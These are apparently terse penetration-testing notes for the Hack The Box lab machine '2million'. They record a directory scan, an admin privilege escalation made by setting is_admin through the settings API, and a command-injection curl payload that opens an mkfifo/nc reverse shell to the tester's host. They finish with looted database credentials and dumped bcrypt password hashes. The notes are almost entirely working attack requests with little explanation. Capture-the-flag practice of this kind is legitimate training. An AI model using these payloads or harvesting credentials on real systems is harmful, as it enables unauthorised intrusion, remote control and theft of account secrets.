



64GLR-J3B6U-23ROK-6K1W9

test@test.com

lv4jargndd7io28fpcnk4pkq6g


feroxbuster -u http://2million.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt 


GET /api/v1 HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=uunul7pqq66sstr9cvdjn3jiad
Connection: keep-alive


admin priv esc (website)

```
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=uunul7pqq66sstr9cvdjn3jiad
Connection: keep-alive
Content-Length: 74
Content-Type: application/json

{
	"email":         "test@test.com",
"is_admin":1,
"username":"test"
}
```

Needed to use command injection to to enter the shell:

``curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=uunul7pqq66sstr9cvdjn3jiad"  --header "Content-Type: application/json" --data '{"username":"test && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.76 4444 >/tmp/f # "}'``


DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123


| 11 | TRX  | trx@hackthebox.eu  | 
$2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
| 12 | TheCyberGeek | thecybergeek@hackthebox.eu | 
$2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |        1 |
| 13 | test         | test@test.com              | $2y$10$27ehExxiqlpibVz5.vu.JuFGkjfNhzx4eQa0yuki3BLLqMp/mL4eW |        1 |
